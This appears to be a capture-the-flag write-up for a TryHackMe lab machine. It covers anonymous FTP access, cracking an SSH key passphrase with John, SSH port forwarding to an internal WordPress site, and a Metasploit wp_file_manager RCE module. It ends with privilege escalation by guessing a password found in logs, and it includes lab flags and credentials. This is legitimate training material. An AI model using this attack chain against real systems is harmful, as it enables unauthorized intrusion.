@@ -1,0 +1,85 @@
+IP : 10.10.232.210
+
+Open Ports : 22, 30024 ftp
+
+ftp : anonymous login allowed
+
+found username in note.txt : errorcauser
+
+But the key needs a passphrase.
+
+Use ssh2john and john to brute it : cupcake
+
+Lets SSH : 
+
+We found a note.txt saying thar a web server is running locally : 
+
+Also looks like we are in a docker.
+
+Lets check which port the local server are running.
+
+Port Forwarding : 
+
+Edit /etc/proxychains.conf :
+
+	Comment : socks4  127.0.0.1 9050
+	Comment : proxy:dns
+	ADD : socks5  127.0.0.1 1337
+
+Now SSH for dynamic port forwarding.
+
+	ssh -i id_rsa -N -D 1337 errorcauser@10.10.232.210
+
+Now we can use NMP with proxy chains.
+
+	proxychains nmap -sT 127.0.0.1
+
+We found that two more ports are open : 80 and 3306
+
+Lets use local port forwarding on with ssh to get the server access on 8080 on kali machine.
+
+	ssh -i id_rsa -L 8080:127.0.0.1:80 errorcauser@10.10.232.210
+
+Now we can access the site at 127.0.0.1:8080
+
+We found a wordpress site.
+
+Now lets run nmap to find vulnerable plugin : 
+
+	sudo nmap --script http-wordpress-enum --script-args check-latest=true,search-limit=1500 -p 8080 127.0.0.1
+
+akismet                                       
+|     duplicator 1.3.26 (latest version:1.4.0)                                                                       │
+|     wp-file-manager 6.0 (latest version:7.1)
+
+
+Found the vulnerabilities : Directory Traversal :  CVE-2020-11738
+
+			  : RCE : CVE-2020-25213
+
+Lets look for msfmodule:
+
+	exploit(multi/http/wp_file_manager_rce)
+
+set lhost, rhost and rport : tun0, 127.0.0.1, 8080 and run
+
+We got a session.
+
+run getuid : cth
+
+cat /home/cth/user.txt : THM{227906201d17d9c45aa93d0122ea1af7}
+
+
+Find user's old password :
+
+	Lets look at the logs.
+
+	User tried to login as root, with password : G00dP@$sw0rd2020
+
+New password guess : G00dP@$sw0rd2021 : it works,
+
+Run sudo su to get a root shell.
+
+Cat /root/root.txt : THM{ad485b44f63393b6a9225974909da5fa}
+
+!!!
